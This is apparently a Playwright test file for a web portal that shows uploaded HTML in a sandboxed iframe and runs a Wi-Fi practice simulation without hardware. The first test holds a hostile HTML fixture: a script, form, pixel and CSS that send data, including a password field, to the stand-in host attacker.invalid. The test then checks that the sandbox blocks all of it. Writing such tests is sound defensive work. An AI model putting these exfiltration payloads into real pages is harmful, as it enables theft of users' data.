import {test,expect} from '@playwright/test';
test('portal aislado bloquea scripts, conexiones y captura de datos',async({page})=>{
 const requests=[];page.on('request',r=>{if(r.url().includes('attacker.invalid'))requests.push(r.url());});
 await page.goto('/');
 await page.locator('input[type=file]').setInputFiles({name:'prueba.html',mimeType:'text/html',buffer:Buffer.from('<html><body><script>top.__portalScriptRan=true;fetch("https://attacker.invalid/steal")</script><form action="https://attacker.invalid/"><input type="password" value="secret"><button>Enviar</button></form><img src="https://attacker.invalid/pixel"><a href="https://attacker.invalid/">Salir</a><style>body{background:url(https://attacker.invalid/css)}</style></body></html>')});
 const frame=page.frameLocator('iframe');
 await expect(frame.locator('input')).toBeDisabled();
 await expect(frame.locator('input')).toHaveAttribute('type','text');
 await expect(frame.locator('script')).toHaveCount(0);
 await expect(frame.locator('a')).not.toHaveAttribute('href');
 await expect(frame.locator('form')).not.toHaveAttribute('action');
 await expect(page.locator('iframe')).toHaveAttribute('sandbox','');
 expect(await page.evaluate(()=>window.__portalScriptRan)).toBeUndefined();
 expect(requests).toEqual([]);
});
test('simulación funciona sin hardware y exporta un reporte',async({page})=>{
 await page.goto('/');await page.getByRole('button',{name:'Iniciar simulación'}).click();
 await expect(page.getByText('Práctica finalizada. No se emitieron señales Wi-Fi.')).toBeVisible({timeout:12000});
 const download=page.waitForEvent('download');await page.getByRole('button',{name:'Exportar registro'}).click();
 expect((await download).suggestedFilename()).toBe('reporte-semillero.json');
});
test('rechaza archivos y muestra la demostración de forma explícita',async({page})=>{
 await page.goto('/');await page.locator('input[type=file]').setInputFiles({name:'texto.txt',mimeType:'text/plain',buffer:Buffer.from('hola')});
 await expect(page.getByRole('alert')).toContainText('Selecciona un archivo');
 await page.getByRole('button',{name:'Dispositivo',exact:true}).click();
 await page.getByRole('button',{name:'Ver demostración sin hardware'}).click();
 await expect(page.locator('.terminal')).toContainText('no es una lectura real');
});
